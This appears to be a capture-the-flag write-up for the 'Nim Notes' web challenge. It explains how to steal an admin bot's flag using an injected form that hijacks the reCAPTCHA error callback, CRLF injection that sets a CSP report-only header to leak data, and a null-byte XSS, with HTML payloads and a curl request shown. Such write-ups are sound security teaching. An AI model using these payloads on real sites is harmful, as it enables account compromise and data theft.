# Nim Notes

* Category: Web
* Score: 500/500
* Solves: 1/854

## Description

I made this note taking web app in Nim as a part of learning it. If you have some cool notes about Nim please share it with me!

## Overview

You have a simple note taking website, which allows you to use markdown to create some notes. The webiste backend is written in Nim, with a small framework called [jester](https://github.com/dom96/jester). You can share you notes with admin (bot), and your target is to steal the flag in admin's notes.

## Solution

The bot only visits `http://web/?user=xxx`, so you might want to direct the bot to your own website first. Your note content are first parsed by marked then filtered by DOMPurify, so you most probably couldn't have a direct XSS (unless you have a DOMPurify 0day lol).

The trick is to notice that recaptcha v2 are used on the website too, and [its documentation](https://developers.google.com/recaptcha/docs/display) listed some ways to interact with it through HTML markup. Obviously, the most interesting things are `data-callback` and `data-error-callback`, they should be specified to be the name of a global function.

Is there anything interesting things can be used as a callback? Of course, there is! In `/js/app.js`, there's a simple function `logout`:

```javascript
function logout() {
	document.getElementById('logout-form').submit()
}
```

It simply submit the `<form>` with id `logout-form`, but the form in `templates/index.html` are located at the very end of HTML, which is after the notes container. If you inject a `<form>` with `logout-form` at container section, it will submit the injected one rather than the original logout one. So you can just provide your website's url to `action` of that form, and it will direct the bot to your site when callback are called.

```html
<form action="YOUR_SERVER" id="logout-form">
<button type=submit class=g-recaptcha data-sitekey=invalid data-error-callback=logout data-action=submit>peko</button>
</form>
```

> The source of this idea comes from [this tweet](https://twitter.com/oreha_senpai/status/1431947638878838786), BTW

After directing the bot to your website, there are one intended solution and one unintended solution (much easier and less interesting) as far as I know.

The intended solution is to use the fact that `setCookie` is vulnerable to CRLF Injection. Since `sign` function simply concat your message and hash together, your payload is directly passed into `setCookie` almost unmodified if you could success at login/register.

You might think it is easy to XSS after CRLF Injection, but in fact, it is not. The injection point are at `Set-Cookie` header, which is after the CSP header. And it is easy to found that you can't really disable CSP even if you could inject headers in modern Chromium. So you still need to find a way to bypass CSP:

```csp
default-src 'self'; script-src 'self' https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/; frame-src https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/;
```

The CSP prevents you from using inline `<script>` tag to XSS, but you can trying to load script with current origin. If this CSRF request are `GET`, you can try to construct a Javascript/HTML polyglot and force the browser to cache the response. Then make a `<script>` tag's `src` to point to itself might work. But it is a `POST` in this challenge, so this won't work.

Another option is trying to use the fact HTTP keep-alive are all in a single TCP connection, since Chromium only opens 6 parallel connections at the same time by default, it is possible to make them reuse same connection for HTML and the script. While this is possible in theory, but Chromium will simply disconnect immediately when it sees more content then it is expecting, so it is important to make it align to packet boundary. This is so complicated that I couldn't make it work in this challenge.

> If you want to know more about this, see **PlaidCTF 2021 - Carmen Sandiego** and **Circle City Con CTF 2021 - Sticky Notes**

So it is impossible to XSS this way? I don't know, but you don't really need XSS to exfiltrate the flag. The trick is to abuse the [Content-Security-Policy-Report-Only](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy-Report-Only) header, which allows you to specify another set of CSP rules, but it only reports the violation to a specified url without blocking it. And the reported infomation is encoded as a JSON, one of the field `script-sample` contains `The first 40 characters of the inline script, event handler, or style that caused the violation.` by MDN.

What if you can make it send the flag to your server using `script-sample`? See the `createNote` function in `/js/app.js`:

```javascript
function createNote(note) {
	const el = document.importNode(document.getElementById('note-tmpl').content, true)
	el.querySelector('.note-title').textContent = note.title
	el.querySelector('.note-author').textContent = note.author
	el.querySelector('.note-content').innerHTML = DOMPurify.sanitize(marked.parse(note.content))
	return el
}
```

It is expected that flag will be in admin's `note.content`, if `.note-content` element is a `<script>` tag then it will put the content (flag) to `script-sample` and send it to your server!

So it is clear that we can use CRLF Injection to set your own `Content-Security-Policy-Report-Only`, and the body will be a HTML with designed `#note-tmpl` template. You also need to load `/js/app.js`, `/js/marked.min.js` and `/js/purify.min.js` to make it work too. Once the bot trying to load that HTML, the violation will be triggered when it wants to set `innerHTML` to be the flag.

The exploit is [exp.py](exp.py), you need to set the `public_host` variable to be a publicly reachable url of that flask server. After starting it, create a note with following content and share it with admin (bot):

```html
<form action="http://IP_OF_THIS_SERVER/csrf" id="logout-form">
<button type=submit class=g-recaptcha data-sitekey=invalid data-error-callback=logout data-action=submit>asd</button>
</form>
```

Then the flask server should prints the flag.

## Unintended Solution

You need to direct the bot to your website first too. But the CSRF part is different here.

The trick is that when your username contains `\0` (null byte), it will cause syntax error in Nim's sqlite library. This happens because it [didn't uses sqlite's prepared statement](https://github.com/nim-lang/Nim/blob/d7370ce26962b3b82e6b9be6562f6e88ba7ff86c/lib/impure/db_sqlite.nim#L214).

And the error message are output **directly** to response by Jester, with no CSP headers.

```bash
> curl 'http://34.81.54.62:8765/login' --data $'username=<script>alert(1)</script>%00&password=peko' -v
*   Trying 34.81.54.62:8765...
* Connected to 34.81.54.62 (34.81.54.62) port 8765 (#0)
> POST /login HTTP/1.1
> Host: 34.81.54.62:8765
> User-Agent: curl/7.81.0
> Accept: */*
> Content-Length: 55
> Content-Type: application/x-www-form-urlencoded
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 502 Bad Gateway
< Server: nginx
< Date: Mon, 28 Feb 2022 03:08:23 GMT
< Content-Type: text/html;charset=utf-8
< Content-Length: 343
< Connection: keep-alive
<
<html xmlns="http://www.w3.org/1999/xhtml"><head><title>Jester route exception</title></head><body><h1>An error has occured in one of your routes.</h1><p><b>Detail: </b>db_sqlite.nim(198)       dbError<br/>
asyncfutures.nim(389)    read<br/>
asyncfutures.nim(389)    read<br/>
* Connection #0 to host 34.81.54.62 left intact
unrecognized token: "'<script>alert(1)</script>"</p></body></html>
```

So you have an easy XSS now, lol.
